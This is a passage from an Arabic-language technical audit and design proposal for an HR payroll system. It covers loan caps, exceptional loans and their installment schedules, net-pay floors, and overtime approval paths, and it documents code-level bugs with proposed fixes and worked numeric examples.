| **T2 — وقت الاعتماد النهائي** | آخر خطوة في السلسلة | الظروف اتغيّرت: الراتب نزل، سلفة تانية اتعتمدت بينهم، الموظف قدّم استقالة | `destinations.service.ts:235` قبل إنشاء `Loan` |
| **T3 — وقت خصم كل قسط** | كل مسير | الصافي في الشهر ده مش كفاية (تأخير + غياب + خصومات) | `payroll.service.ts:309-325` |

**سبب T2 حاسم:** بين الطلب والاعتماد ممكن يعدي أسبوعين. لو التحقق وقت الطلب بس، الموظف يقدر يقدّم 3 طلبات في يوم واحد وكلها تعدّي فحص «سلفة واحدة قائمة» لأن ولا واحدة اتنفّذت بعد. **T2 هو اللي يمنع السباق (race).**

#### ماذا لو تغيّر الراتب بعد الموافقة؟

في ٣ سيناريوهات، والقرار المقترح لكل واحد:

| السيناريو | القرار المقترح | التنفيذ |
|---|---|---|
| **الراتب زاد** بعد الموافقة | المبلغ المعتمد يفضل زي ما هو — **لا يُعاد فتحه** | لا شيء. الزيادة تفيد في سلفة الجاية |
| **الراتب نقص** والسلفة **لسه ما اتصرفتش** | إعادة تقييم إلزامية (T2) — لو المبلغ فوق السقف الجديد → يرجع للموارد البشرية بخيارين: تخفيض المبلغ أو مدّ الأشهر | `status: APPROVED → PENDING_REVIEW` |
| **الراتب نقص** والسلفة **اتصرفت والأقساط شغّالة** | **المبلغ لا يُمس** (الفلوس اتاخدت)، لكن **جدول الأقساط يُعاد تشكيله** لو القسط بقى يكسر `minNetPercent` | مدّ المدة تلقائيًا (انظر ٥-٢) |

**قرار السكيمة:** نحفظ **لقطة** على السلفة نفسها:

```ts
salaryAtApproval: number       // الأساس وقت الموافقة
policyIdAtApproval: number     // السياسة المطبَّقة
capAtApproval: number          // effectiveCap المحسوب — للتدقيق
```

من غير اللقطة دي مستحيل تدقّق بعد سنة «إزاي الموظف ده أخد 12,000 والسقف 5,000؟».

#### مثال رقمي محسوب

**الموظف:** أساسي 6,000 · بدلات دائمة 2,000 · **إجمالي 8,000** · خدمة 14 شهرًا · رصيد سلف قائم 1,500.
**السياسة:** `basisType=GROSS` · `maxPercentOfSalary=10` · `maxAmount=5000` · `maxOutstandingPercent=30` · `maxMonths=6` · `maxConcurrentActive=1`.

```
base   = 8,000
capA   = 8,000 × 10%  = 800
capB   = 5,000
capC   = (8,000 × 30%) − 1,500 = 2,400 − 1,500 = 900
effectiveCap = MIN(800, 5000, 900) = 800      ← cappedBy = "نسبة من الراتب"
```
لكن **الفحص العدّادي يرفض أصلًا**: عنده سلفة قائمة و`maxConcurrentActive = 1` → **رفض مباشر**، والرسالة: «لديك سلفة قائمة برصيد 1,500 ج — لا يمكن طلب سلفة جديدة قبل إقفالها».

**نفس الموظف بعد إقفال السلفة القديمة:**
```
capC = 2,400 − 0 = 2,400
effectiveCap = MIN(800, 5000, 2400) = 800     ← 800 ج هو المتاح
```

#### حالات حدّية

| الحالة | القاعدة المقترحة |
|---|---|
| موظف بدون راتب مسجّل (`basicSalary = 0`) | `effectiveCap = 0` + رسالة «الراتب غير مُعرَّف — راجع الموارد البشرية». **ممنوع** الرجوع لـ`∞` بالخطأ |
| موظف تحت التجربة | `requiresProbationPassed = true` → رفض بسبب واضح |
| موظف قدّم استقالة / في دورة إنهاء خدمة | رفض تلقائي — الرصيد مش هيلحق يتسدّد |
| سياستان بنفس التخصيص (فرع + قسم) | الأخص يفوز؛ عند التساوي `priority` الأعلى؛ عند التساوي التام → **الأقل سقفًا** |
| السقف بنسبة والراتب متغيّر شهريًا (عمولة) | استخدم `basisType=BASIC` فقط — النسبة على متغيّر تنتج سقفًا متذبذبًا |
| `effectiveCap` طلع سالب (المديونية فوق السقف) | `max(0, …)` ثم رفض برسالة «رصيد مديونيتك تجاوز الحد المسموح» |

---

### ٥-٢) السلفة الاستثنائية (⑪)

#### المطلوب حرفيًا
> «تكون عند الموارد البشرية: موظف طلب مبلغًا كبيرًا لظرف خاص. الموارد البشرية هي من تعمل السلفة، وتحدد طريقة الخصم: شهر واحد أو شهرين أو ثلاثة بحسب المبلغ. النظام مباشرة يقسّم المبلغ على عدد الأشهر ويخصمه شهريًا.»

#### الحالة عندنا الآن — **الآلة موجودة، والحوكمة مفقودة**

| البند | الحالة | الدليل |
|---|---|---|
| كيان `Loan` | **موجود — بنية أدنى جدًا** | `api/src/requests/entities/financial.entities.ts:11-31` — الحقول كلها: `id, requestId, employeeId, amount, status, disbursedAt`. **لا `months`، لا `type`، لا `remainingAmount`، لا `startDate`، لا `approvedBy`، لا `reason`** |
| كيان `LoanInstallment` | **موجود** | `financial.entities.ts:33-50` — `loanId, dueDate, amount, paid`. **لا `seq`، لا `paidAt`، لا `payrollRunId`، لا حالة تأجيل** |
| التقسيط التلقائي | **موجود ويعمل** | `destinations.service.ts:244-259` |
| **معالجة الكسور** | **موجودة فعليًا** ✔ | `destinations.service.ts:245` (`per = round(amount/months, 2)`) و`:256` (`i === months ? amount − per×(months−1) : per`) — **القسط الأخير يمتص الفرق بالفعل** |
| **تمييز «استثنائية»** | **غير موجود** | لا حقل `loanType`. السلفة الاستثنائية والعادية كيان واحد بلا فرق |
| **إنشاء مباشر من HR** | **غير موجود** | لا `POST /loans`. المسار الوحيد = طلب `LOAN` من الموظف يمرّ بـ`CHAIN_MANAGER_FINANCE_T` (`requests-seed.data.ts:162`). **الموارد البشرية لا تقدر تنشئ سلفة لموظف ابتداءً** — وده جوهر البند ⑪ |
| تحرير جدول الأقساط | **غير موجود** | لا `PATCH /loans/:id/installments` — الجدول جامد بعد الإنشاء |
| بداية الجدول | **جامدة** | `destinations.service.ts:250-251` → دائمًا **أول الشهر التالي**. لا اختيار `startDate`، ولا فترة سماح |
| ترك الخدمة والرصيد قائم | **موجود ويعمل** ✔ | `api/src/offboarding/offboarding.service.ts:326-343` — يجمع كل الأقساط `paid=false` وينشئ سطر تصفية `DEBIT` باسم «رصيد سلف متبقٍ» |
| سقف إجمالي المديونية | **غير موجود** | `payroll.service.ts:345-354` يطرح مباشرة → **`netPay` ممكن يطلع سالب** |

##### 🐞 خلل مؤكَّد يجب تسجيله

نوع الطلب `EARLY_LOAN_SETTLEMENT` (سداد سلفة مبكر) مربوط بنفس المعالج:
```
requests-seed.data.ts:167 → handler: 'loans_installments', requiredFields: ['loanId']
destinations.service.ts:732 → loans_installments: this.loanHandler
destinations.service.ts:236 → const amount = Number(payload.amount)   // ← payload فيه loanId فقط
```
النتيجة: **طلب «سداد مبكر» ينشئ سلفة جديدة بمبلغ `NaN`** بدل ما يقفل السلفة القائمة. لازم معالج منفصل `loan_early_settlement`.

#### التصميم المقترح — السكيمة الكاملة

```ts
export type LoanType   = 'STANDARD' | 'EXCEPTIONAL' | 'SALARY_ADVANCE'
export type LoanStatus = 'DRAFT' | 'PENDING_APPROVAL' | 'APPROVED'
                       | 'DISBURSED' | 'ACTIVE' | 'SETTLED'
                       | 'CANCELLED' | 'WRITTEN_OFF'

@Entity('loans')
export class Loan {
  id: number
  employeeId: number
  requestId: number | null       // null = أنشأتها HR مباشرة (المسار الاستثنائي)
  loanType: LoanType
  principal: number              // أصل المبلغ
  months: number                 // عدد أشهر التقسيط (1|2|3|…)
  startDate: string              // تاريخ استحقاق أول قسط — قابل للتحديد
  status: LoanStatus
  remainingAmount: number        // مُحدَّث عند كل خصم (denormalized للسرعة)
  // ===== حوكمة التجاوز =====
  policyId: number | null
  capAtApproval: number          // السقف وقت الموافقة
  salaryAtApproval: number       // الأساس وقت الموافقة
  exceedsCap: boolean            // هل تجاوزت السقف؟
  overrideReason: string | null  // ⚠️ إلزامي لو exceedsCap = true
  overrideApprovedBy: number     // users.id — من أجاز التجاوز
  // ===== التتبّع =====
  createdByUserId: number
  approvedBy: number | null
  approvedAt: Date | null
  disbursedAt: Date | null
  settledAt: Date | null
  notes: string | null
}

export type InstallmentStatus = 'DUE' | 'PAID' | 'PARTIAL'
                              | 'DEFERRED' | 'WAIVED' | 'CANCELLED'

@Entity('loan_installments')
export class LoanInstallment {
  id: number
  loanId: number
  seq: number                    // 1..months — ترتيب صريح
  dueDate: string
  amount: number                 // المستحق
  paidAmount: number             // المسدَّد فعليًا (يدعم الخصم الجزئي)
  status: InstallmentStatus
  paidAt: Date | null
  payrollRunId: number | null    // المسير الذي خصمه ← لا ازدواج، وتدقيق كامل
  payrollItemId: number | null
  deferReason: string | null
}
```

**الحقلان الحاسمان الجديدان:** `payrollRunId` على القسط (بيمنع الخصم مرتين ويربط القسط بمصدر الصرف) و`seq` (بيخلّي «القسط الأخير» معرَّف بدقة بدل الاعتماد على ترتيب التواريخ).

#### توليد جدول الأقساط ومعالجة الكسور

القاعدة الحالية بتستخدم `Math.round` وده بيخلّي القسط الأخير أحيانًا **أقل** من الباقي، وفي حالة نادرة ممكن يطلع سالب. القاعدة الأسلم:

```
generateSchedule(principal, months, startDate):
  # اشتغل بالقروش (أعداد صحيحة) — مفيش أخطاء عائمة إطلاقًا
  totalCents = round(principal × 100)
  perCents   = floor(totalCents / months)          # القسط القياسي (لأسفل)
  remainder  = totalCents − perCents × months      # الباقي بالقروش (0..months−1)

  for i in 1..months:
     dueDate = addMonths(startDate, i − 1)
     amountCents = (i === months)
                   ? perCents + remainder          # الأخير يمتص كل الفرق
                   : perCents
     save({ loanId, seq: i, dueDate, amount: amountCents/100, status: 'DUE' })

  # ضمانات
  assert Σ(amounts) === principal            # لا قرش يضيع ولا يُخلق
  assert amounts[months] ≥ amounts[1]        # الأخير دائمًا ≥ الباقي (لا سالب أبدًا)
```

**مقارنة عملية — 1,000 ج على 7 أشهر:**

| الطريقة | الأقساط 1..6 | القسط 7 | المجموع | الملاحظة |
|---|---|---|---|---|
| الحالية (`round`) | 142.86 | 142.84 | 1,000.00 | يعمل، لكن الأخير أقل |
| المقترحة (`floor`+باقي) | 142.85 | **142.90** | 1,000.00 | الأخير أكبر — سلوك متوقّع ومقبول محاسبيًا |

**مثال السلفة الاستثنائية (⑪ حرفيًا):** موظف إجماليه 8,000 والسقف 800، طلب **12,000** لظرف خاص. HR تنشئ سلفة `EXCEPTIONAL` بـ`months = 3`:
```
totalCents = 1,200,000
perCents   = floor(1,200,000 / 3) = 400,000
remainder  = 0
→ 3 أقساط متساوية: 4,000.00 · 4,000.00 · 4,000.00
exceedsCap = true  (12,000 > 800)
overrideReason = "ظرف علاجي — موافقة المدير التنفيذي رقم 2026/118"   ← إلزامي
```

#### 🚨 سقف إجمالي المديونية — الحاجز المفقود الأخطر

المثال فوق **يكسر الموظف**: قسط 4,000 من إجمالي 8,000 = **50% من الدخل**، وقبله خصومات تأخير وغياب. القاعدة اللازمة:

```
applyInstallment(item, installment, policy):
  # 1) احسب الصافي المبدئي قبل السلف
  netBeforeLoans = gross + overtime + additions
                   − lateness − absence − unpaidLeave − otherDeductions

  # 2) الأرضية: الصافي لا يقل عن نسبة من الإجمالي
  floor = gross × (policy.minNetPercent ?? 50) / 100

  # 3) المساحة المتاحة للخصم
  available = max(0, netBeforeLoans − floor)

  # 4) خصم القسط جزئيًا لو لازم
  if installment.amount <= available:
      خصم كامل → status = PAID، paidAmount = amount، payrollRunId = run.id
  else:
      خصم جزئي  → paidAmount = available، status = PARTIAL
      رحّل الباقي: قسط جديد seq = max+1 بتاريخ الشهر التالي (تمديد تلقائي)
      سجّل في breakdown: { deferredAmount, reason: 'NET_FLOOR' }
```

**تطبيق على المثال:** خصومات تأخير 300 ج في الشهر ده.
```
netBeforeLoans = 8,000 − 300 = 7,700
floor          = 8,000 × 50% = 4,000
available      = 7,700 − 4,000 = 3,700
القسط 4,000 > 3,700  → يُخصم 3,700 فقط
                      → قسط جديد #4 بقيمة 300 في الشهر التالي
netPay = 7,700 − 3,700 = 4,000   ✅ الأرضية محفوظة
```
من غير القاعدة دي، الكود الحالي (`payroll.service.ts:345-354`) بيطرح مباشرة — و**`netPay` سالب وارد**.

#### ترك الخدمة والرصيد قائم

الموجود عندنا (`offboarding.service.ts:326-343`) صح ويشتغل، لكن ناقصه ٣ حاجات:

| الناقص | القاعدة المقترحة |
|---|---|
| الأقساط تفضل `DUE` بعد التصفية | عند اعتماد التصفية: كل الأقساط غير المدفوعة → `status = CANCELLED` + `deferReason = 'SETTLEMENT:<caseId>'`، والسلفة → `SETTLED`. **من غير ده المسير الشهري لسه يقدر يخصمها تاني** |
| التصفية أقل من الرصيد | الفرق يتحوّل لقيد `EmployeeObligation` نوع `DEBIT` بحالة `LEGAL_FOLLOWUP` (أو سلفة بحالة `WRITTEN_OFF` مع سبب) — علشان يفضل ظاهر في التقارير مش يختفي |
| مفيش تجميد قبل التصفية | بمجرد فتح ملف إنهاء خدمة → السلفة `frozen = true` → مفيش خصم شهري تاني عليها لحد ما التصفية تخلص، منعًا للازدواج |

#### حالات حدّية

| الحالة | القاعدة |
|---|---|
| `months = 0` أو سالب | رفض (`months ≥ 1`) — الكود الحالي بيصحّح لـ1 صامتًا وده يخفي خطأ إدخال |
| `months > principal` (12 شهر على 5 ج) | رفض: «القسط أقل من الحد الأدنى» — امنع قسط أقل من وحدة عملة واحدة |
| السلفة اتصرفت والموظف اتنقل لفرع تاني | السلفة على **الموظف** لا الفرع → تكمل معه؛ في تقرير السلف تظهر تحت الفرع الحالي مع عمود «فرع الإنشاء» |
| قسط استحق في شهر والمسير اتأخر شهرين | ⚠️ **خلل قائم**: `payroll.service.ts:319` بيستعلم `dueDate: Between(startDate, endDate)` فقط → **القسط الفايت يسقط للأبد**. الإصلاح: `dueDate <= endDate AND status IN ('DUE','PARTIAL')` |
| موظفان لهما نفس السلفة في مسيرين للفترة نفسها | يُمنع بـ`payrollRunId` على القسط + تفعيل `PayrollRunMember` كحاجز (انظر تدقيق الرواتب، الثغرة #3) |
| المسير اتحسب ثم اتلغى (`delete`) | لازم rollback: `installment.status → DUE`، `paidAmount → 0`، `payrollRunId → null`. الكود الحالي (`payroll.service.ts:436-441`) بيعلّم `paid = true` بلا مسار عكسي |
| سداد مبكر (الموظف دفع كاش) | معالج مستقل: كل الأقساط `DUE` → `WAIVED`, السلفة → `SETTLED`, `settledAt = now` |

---

### ٥-٣) الأوفرتايم (⑫) — المسارات الثلاثة

#### الصورة الكاملة في جدول واحد

| المسار | متى يعمل | الحالة عندنا | من يعتمد | مصدر الساعات |
|---|---|---|---|---|
| **① نافذة فتح/إغلاق بالتاريخ** | دائمًا — بوابة عامة | **موجود بالكامل** ✔ | HR (تعريف الفترة) | — (بوابة فقط) |
| **② اكتشاف من البصمة** | الفترة **مفتوحة** فقط | **موجود ويعمل** ✔ | مدير مباشر → رئيس قسم → HR | البصمة تلقائيًا |
| **③ طلب الموظف بنفسه** | الفترة **مقفولة** (والمفتوحة كذلك) | **مكسور — يُدفع صفرًا** ❌ | نفس السلسلة | مفروض: البصمة. فعليًا: **لا شيء** |

---

#### المسار ① — نوافذ الفتح/الإغلاق بالتاريخ

**الحالة: موجود ومكتمل.**

| العنصر | الدليل |
|---|---|
| الكيان `OvertimePeriod` | `api/src/attendance/attendance.entities.ts:241-263` — `name, fromDate, toDate, effect: OPEN\|CLOSED, branchId, isActive` |
| قرار الفتح/القفل | `api/src/attendance/attendance.service.ts:342-353` |
| CRUD + تحقق التواريخ | `attendance.service.ts:355-430` · المسارات `attendance.controller.ts:182-221` بصلاحية `attendance.manage` |

**منطق القرار (بالترتيب — وده صحيح تمامًا):**
```ts
// attendance.service.ts:342-353
const covering = periods.filter(p =>
    (p.branchId == null || p.branchId === branchId)   // null = كل الفروع
    && p.fromDate <= date && p.toDate >= date)

if (covering.some(p => p.effect === 'CLOSED')) return false   // ① الإغلاق يغلب
if (covering.some(p => p.effect === 'OPEN'))   return true    // ② ثم الفتح
return configValue('overtime.enabled', 'true') === 'true'     // ③ ثم المفتاح العام
```

| القاعدة | التحقق |
|---|---|
| **الإغلاق يغلب عند التداخل** | ✔ صحيح — `CLOSED` يُفحص أولًا وينهي القرار |
| **نطاق الفرع** | ✔ `branchId = null` تعني كل الفروع؛ فترة الفرع تُضاف للعامة لا تحلّ محلها. **ملاحظة:** فترة فرع `OPEN` **لا تلغي** فترة عامة `CLOSED` — الإغلاق العام يغلب الفتح الفرعي. لو المطلوب العكس، الترتيب يتغيّر لـ«الأخص أولًا» |
| **في الفترة المقفولة لا يُحتسب إضافي تلقائيًا** | ✔ `attendance.service.ts:1231-1241` |

**فجوتان في هذا المسار:**

| # | الفجوة | الدليل | الإصلاح |
|---|---|---|---|
| P1-a | مفتاح `overtime.enabled` **غير مزروع** في البذرة → `PATCH /settings/config` يرجّع 404 (`settings.controller.ts:392-393`) → **زر القفل العام في الشاشة يفشل دائمًا** (`src/app/settings/work-days/page.tsx:45, 484`) | `requests-seed.data.ts:236` | أضِف `{ key: 'overtime.enabled', value: 'true' }` للبذرة — سطر واحد |
| P1-b | القفل بأثر رجعي يحذف `BIOMETRIC_DETECTED + DETECTED` **فقط** (`attendance.service.ts:1234-1239`). لو `overtime.biometric_requires_confirmation = false` القيد يُنشأ `APPROVED` مباشرة (`:1275`) و**لا يُحذف عند القفل الرجعي** → يُدفع رغم الإقفال | نفس السطور | عند إنشاء/تعديل فترة `CLOSED`: مسح شامل للفترة للقيود `source='BIOMETRIC_DETECTED'` مهما كانت حالتها ما دامت `status ≠ 'PAID'` |

---

#### المسار ② — الاكتشاف من البصمة + دورة الاعتماد

**الحالة: موجود ويعمل.** التسلسل الفعلي:

```
بصمة (ZKTeco / يدوي)
   ↓
computeDay(emp, date)                       attendance.service.ts
   ↓  (يتطلب checkIn && checkOut معًا — :1175)
detectOvertime(emp, date, shift, in, out, dayKind)   :1195
   ↓
isOvertimeOpen(date, branchId)?  ── لا ──→ حذف القيد المكتشف · انتهى
   ↓ نعم
actualHours ≥ threshold?                    :1243-1251
   (Shift.overtimeThresholdHours أو overtime.detection_threshold_hours = 0.5 س)
   ↓ نعم
قيد OvertimeEntry {
   source: 'BIOMETRIC_DETECTED',
   hoursActual, rate = مُضاعِف نوع اليوم,
   status: requiresConfirmation ? 'DETECTED' : 'APPROVED'   :1262-1277
}
   ↓
كرون كل 3 دقائق: reconcileAutoOvertime()    requests.service.ts:1052-1119
   ↓
طلب OVERTIME_AUTO → سلسلة CHAIN_MANAGER    requests-seed.data.ts:155
   ↓ (مدير مباشر → … → HR)
overtimeAutoHandler                          destinations.service.ts:200-211
   → status = APPROVED · payableHours = hoursActual
   ↓
المسير: Σ payableHours × rate × hourRate     payroll.service.ts:244-253
```

**«لا يُحتسب بلا اعتماد» — محقَّق؟** ✔ نعم بشرط:
- `payroll.service.ts:240` يقرأ `status: 'APPROVED'` فقط — القيد `DETECTED` لا يُدفع أبدًا. ✅
- **لكن** لو `overtime.biometric_requires_confirmation = false`، القيد يُنشأ `APPROVED` مباشرة من غير أي بني آدم (`attendance.service.ts:1275`) — **ده يكسر شرط «لا يُحتسب مرة واحدة بلا اعتماد»**.
- **التوصية:** احذف المفتاح ده تمامًا، أو اقفله على `true` دائمًا واعتبره `deprecated`. البند ⑫ نصّ صريح على الاعتماد.

**سلسلة الاعتماد ثلاثية المستوى المطلوبة** (مدير مباشر → رئيس قسم → HR): الموجود اليوم `CHAIN_MANAGER` (`requests-seed.data.ts:155`) — سلسلة موجودة وقابلة للتعريف. تحقيق الثلاث خطوات = تعريف سلسلة `CHAIN_MANAGER_DEPT_HR` في البذرة وربطها بـ`OVERTIME_AUTO`. **لا يحتاج كود جديد** — بيانات فقط.

---

#### المسار ③ — طلب الموظف في الفترة المقفولة ⚠️ **مكسور**

##### المطلوب حرفيًا
> «في الفترة المقفولة، الموظف يطلب احتساب إضافي ليوم معيّن، والنظام مباشرة يرجع لذلك اليوم ويحسب كم ساعة إضافي كانت له ويحتسبها.»

##### ما يحدث فعليًا اليوم — بالتسلسل

**1.** الموظف يقدّم `OVERTIME` بـ`{date, hours}` (`requests-seed.data.ts:154`).
> ❌ **لا تحقق** من الفترة المقفولة، ولا من وجود بصمة أصلًا، ولا مقارنة `hours` بالفعلي. الموظف يكتب الرقم من دماغه.

**2.** السلسلة تكتمل → `overtimeHandler` ينشئ القيد:
```ts
// destinations.service.ts:183-194
const entry = await em.getRepository(OvertimeEntry).save({
  requestId: req.id,
  employeeId: req.requesterId,
  date: String(payload.date),
  source: 'PRE_REQUESTED',
  hoursRequested: Number(payload.hours),
  rate: Number(wdMult?.value ?? '1.5'),   // ← دائمًا مُضاعِف يوم العمل
  status: 'APPROVED',
})                                        // ← payableHours لم يُذكر = undefined
```

**3.** `payableHours` **يُملأ في مكان واحد يتيم** في المشروع كله — جوّه `detectOvertime`:
```ts
// attendance.service.ts:1214-1228 — الكود سليم، لكن لا أحد يستدعيه
const preApproved = await this.overtime.findOne({
  where: { employeeId: emp.id, date, source: 'PRE_REQUESTED' } })
if (preApproved) {
  preApproved.hoursActual = Math.max(0, actualHours)
  preApproved.rate = rate                              // ← يصحّح المُضاعِف
  if (preApproved.status === 'APPROVED') {
    preApproved.payableHours = Math.min(
      Number(preApproved.hoursRequested ?? 0), Math.max(0, actualHours))
  }
  await this.overtime.save(preApproved)
  return                                               // ← لا يمر على isOvertimeOpen
}
```
> لاحظ: المنطق **مصمَّم صح** — الطلب المعتمد يتجاوز القفل عمدًا (تعليق `:1212`)، والساعات = `min(المطلوب، الفعلي)`، والمُضاعِف يُصحَّح لنوع اليوم. **المشكلة مش في الحساب — المشكلة إن الدالة دي لا تُستدعى أبدًا بعد الاعتماد.**

**4.** 🔴 **نقطة الكسر بالضبط.** كتلة إعادة الحساب بعد اعتماد أي طلب:
```ts
// requests.service.ts:756-772
if (isLeave && fromDate && toDate) {              → computeDay لكل يوم
} else if (isPermission && payload.date) {        → computeDay
} else if (saved.typeCode === 'PUNCH_CORRECTION') → computeDay
                                                  // ← لا فرع لـ OVERTIME
```
**`OVERTIME` غير مذكور في السلسلة.** فمفيش `computeDay` → مفيش `detectOvertime` → `payableHours` يفضل `null`.

**5.** والمسير **لا ينقذ الموقف**: `payroll.service.ts:259` بيستدعي `materializeAbsences` بس، وهي بتتخطّى أي يوم صفّه مستقر (`attendance.service.ts:580`: `if (existing && existing.status !== 'absent') continue`) — **يوم حاضر لا يُعاد حسابه أبدًا**.

**6.** النتيجة النهائية: `payroll.service.ts:245` → `Number(r.payableHours ?? 0)` = **صفر**.

##### مثال رقمي للخلل

**الموظف:** إجمالي 8,000 · `monthlyDays=30` · `dailyHours=8` → `dayRate = 266.67` · `hourRate = 33.33`.
**الوضع:** فترة `CLOSED` من 2026-06-01 إلى 2026-06-30. يوم 2026-06-18 (يوم عمل، وردية 09:00→18:00) بصماته: دخول 08:55 · خروج 21:10.

| | المفروض | الواقع اليوم |
|---|---|---|
| الساعات الفعلية | `21:10 − 18:00 = 190 د = 3.17 س` | 3.17 (محسوبة صح لو `computeDay` اشتغل) |
| الموظف طلب | 4 ساعات | 4 ساعات |
| `payableHours` | `min(4, 3.17) = 3.17` | **`null`** |
| المُضاعِف | 1.5 (يوم عمل) | 1.5 |
| **المبلغ في المسير** | `3.17 × 33.33 × 1.5 = 158.48 ج` | **`0.00 ج`** ❌ |

الطلب يظهر في السجل بحالة «معتمد»، والموظف يشوفه معتمدًا، **ويستلم صفر**. ده أسوأ نوع من الأخطاء: صامت وموثّق كنجاح.

##### الإصلاح — ٤ تعديلات مرتّبة بالأولوية

**الإصلاح ①  (سطر واحد — يوقف النزيف فورًا):** أضِف `OVERTIME` لسلسلة إعادة الحساب:
```ts
// requests.service.ts — بعد فرع PUNCH_CORRECTION (:769-771)
} else if (saved.typeCode === 'OVERTIME' && payload.date) {
  await this.attendance.computeDay(saved.requesterId, String(payload.date))
}
```

**الإصلاح ②  (الأمتن — يشيل الاعتماد على أثر جانبي):** خلّي `overtimeHandler` نفسه يحسب الساعات وقت التنفيذ، بدل ما يستنى `computeDay` يمر بالصدفة:
```ts
// دالة عامة جديدة في AttendanceService — تقرأ البصمات وترجع الحقيقة
async overtimeHoursFor(employeeId, date): Promise<{
  actualHours: number, dayKind: 'WORKING'|'WEEKEND'|'HOLIDAY',
  rate: number, checkIn: string|null, checkOut: string|null,
  hasCompletePunches: boolean
}>

// destinations.service.ts — overtimeHandler يصير:
const calc = await this.attendance.overtimeHoursFor(req.requesterId, payload.date)
const entry = await repo.save({
  ..., source: 'PRE_REQUESTED',
  hoursRequested: Number(payload.hours),
  hoursActual:  calc.actualHours,
  payableHours: Math.min(Number(payload.hours), calc.actualHours),  // ← يُملأ فورًا
  rate: calc.rate,                                    // ← مُضاعِف اليوم الحقيقي
  status: calc.hasCompletePunches ? 'APPROVED' : 'PENDING_PUNCH',
})
```

**الإصلاح ③  (تجربة المستخدم — يمنع الطلبات الوهمية):** endpoint معاينة يستهلكه نموذج الطلب:
```
GET /attendance/overtime/preview?date=2026-06-18
→ { checkIn: "08:55", checkOut: "21:10", shiftEnd: "18:00",
    dayKind: "WORKING", actualHours: 3.17, rate: 1.5,
    estimatedAmount: 158.48, periodStatus: "CLOSED",
    note: "الفترة مقفولة — الطلب يمر بدورة اعتماد" }
```
الموظف يشوف الرقم الحقيقي قبل ما يقدّم، والفارق بين المطلوب والفعلي يبقى ظاهر للمعتمِد.

**الإصلاح ④  (تصحيح المُضاعِف):** `destinations.service.ts:180-192` بيثبّت `multiplier_weekday` دائمًا. لو الطلب على يوم جمعة أو عيد، المُضاعِف غلط لحد ما `detectOvertime` يمر. الإصلاح ② بيحلّها ضمنًا.

##### فجوات مصاحبة في نفس المسار

| # | الفجوة | الدليل | القاعدة المقترحة |
|---|---|---|---|
| G2 | بصمة خروج ناقصة → **لا أوفرتايم إطلاقًا** حتى مع طلب معتمد | `attendance.service.ts:1175` (`detectOvertime` يتطلب `checkIn && checkOut`) | حالة `PENDING_PUNCH` + إلزام `PUNCH_CORRECTION` أولًا، أو سماح لـHR بإدخال `payableHours` يدويًا مع سبب مسجَّل |
| G5 | نوع واحد `OVERTIME` بسلسلة واحدة — لا تمييز بين طلب في فترة مفتوحة ومقفولة | `requests-seed.data.ts:154` | حقل `periodStatusAtRequest` على القيد + سلسلة أطول (+HR) لو `CLOSED` |
| — | لا سقف يومي/شهري للأوفرتايم | مفيش `overtime.max_hours_per_day` / `_per_month` | مفاتيح جديدة + رفض عند التجاوز |
| — | لا حد رجعي لتاريخ الطلب | مفيش `overtime.request_backdate_days` | مفتاح جديد — «لا تُقبل طلبات على أيام أقدم من 30 يومًا» |
| — | الحضور المبكر قبل الوردية لا يُحتسب أوفرتايم في يوم العمل | `attendance.service.ts:1205-1208` (`checkOut − shiftEnd` فقط) | `extra = max(0, shiftStart − checkIn) + max(0, checkOut − shiftEnd)` بمفتاح تفعيل |

#### المضاعفات — من أين تُقرأ

| نوع اليوم | المفتاح | الافتراضي | مكان القراءة |
|---|---|---|---|
| يوم عمل | `overtime.multiplier_weekday` | 1.5 | `attendance.service.ts:1190` · `destinations.service.ts:182` |
| نهاية أسبوع | `overtime.multiplier_weekend` | 1.5 | `attendance.service.ts:1189` |
| عطلة رسمية | `overtime.multiplier_holiday` | 2 | `attendance.service.ts:1187` |

**تحديد نوع اليوم (`dayKind`) — موجود ومحكم** (`attendance.service.ts:167-172`, `1013`) بأولوية:
```
① عطلة رسمية؟  ← جدول public_holidays          → HOLIDAY
② قاعدة استثناء تقلبه؟ ← schedule_exception_rules (WORK/OFF، بنطاق فرع)
③ يوم ويك إند؟  ← WorkSchedule.weekendDays
                  ثم Branch.weekendDays
                  ثم attendance.weekend_days ('FRI,SAT')  → WEEKEND
④ غير ذلك                                                → WORKING
```

**نقطة تصميم:** المضاعفات دلوقتي **مفاتيح config عامة للشركة كلها**. لو المطلوب مضاعف مختلف لكل فرع/وردية (زي ما البند ③ بيطلب لباقي المعادلات)، لازم تنتقل لكيان:
```ts
@Entity('overtime_rules')
class OvertimeRule {
  id, name, scopeType: 'COMPANY'|'BRANCH'|'SHIFT'|'DEPARTMENT', scopeIds,
  dayKind: 'WORKING'|'WEEKEND'|'HOLIDAY',
  multiplier: number,
  maxHoursPerDay, maxHoursPerMonth,
  countEarlyArrival: boolean,        // هل الحضور المبكر يُحتسب؟
  roundingMinutes: number,           // تقريب لأقرب 15/30 دقيقة
  priority, isActive
}
```

#### أمثلة رقمية شاملة

**الموظف:** إجمالي 8,000 · `hourRate = 33.33`.

| اليوم | نوع اليوم | البصمة | الفعلي | المُضاعِف | المبلغ |
|---|---|---|---|---|---|
| الأحد 14/6 | WORKING (وردية 09:00–18:00) | 08:55 → 20:30 | 2.50 س | 1.5 | `2.50 × 33.33 × 1.5 = 125.00` |
| الجمعة 19/6 | WEEKEND | 10:00 → 15:00 | 5.00 س | 1.5 | `5.00 × 33.33 × 1.5 = 250.00` |
| الثلاثاء 23/6 | HOLIDAY (عيد) | 09:00 → 14:00 | 5.00 س | 2.0 | `5.00 × 33.33 × 2.0 = 333.30` |
| | | | | **الإجمالي** | **708.30 ج** |

**أثر الفترة المقفولة على نفس الأيام:** لو 1/6→30/6 فترة `CLOSED`:
- المسار ② (اكتشاف تلقائي): **صفر** — القيود اتحذفت (`attendance.service.ts:1234-1239`) ✔ سلوك مقصود.
- المسار ③ (طلب الموظف): **المفروض 708.30** بعد الاعتماد — **الواقع اليوم 0.00** ❌ لحد ما الإصلاح ينزل.

#### حالات حدّية

| الحالة | القاعدة |
|---|---|
| الموظف طلب 8 ساعات والفعلي 3 | `payableHours = min(8, 3) = 3` ✔ موجود (`attendance.service.ts:1221-1224`) — والفرق يظهر للمعتمِد كإنذار |
| الموظف طلب 2 والفعلي 6 | يُدفع 2 فقط (`min`) — الباقي محتاج طلب منفصل أو اكتشاف تلقائي |
